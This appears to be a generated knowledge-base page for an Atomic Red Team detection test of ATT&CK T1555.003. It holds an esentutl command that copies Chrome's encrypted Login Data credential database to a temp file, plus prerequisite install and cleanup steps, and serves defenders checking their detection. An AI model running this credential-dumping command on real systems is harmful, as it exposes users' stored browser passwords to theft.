---
atomic_guid: "70422253-8198-4019-b617-6be401b49fce"
title: "Dump Chrome Login Data with esentutl"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "70422253-8198-4019-b617-6be401b49fce"
  - "Dump Chrome Login Data with esentutl"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Dump Chrome Login Data with esentutl

This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.
[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)

## Metadata

- Atomic GUID: 70422253-8198-4019-b617-6be401b49fce
- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1555.003/T1555.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]

## Input Arguments

### output_path

- description: File path for login data dump
- type: string
- default: %temp%\T1555.003_Login_Data.tmp

## Dependencies

Chrome must be installed

### Prerequisite Check

```text
if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath "chrome.exe"
Stop-Process -Name "chrome"
```

## Executor

- name: command_prompt

### Command

```commandprompt
esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "#{output_path}"
```

### Cleanup

```commandprompt
del /f /q #{output_path} > nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
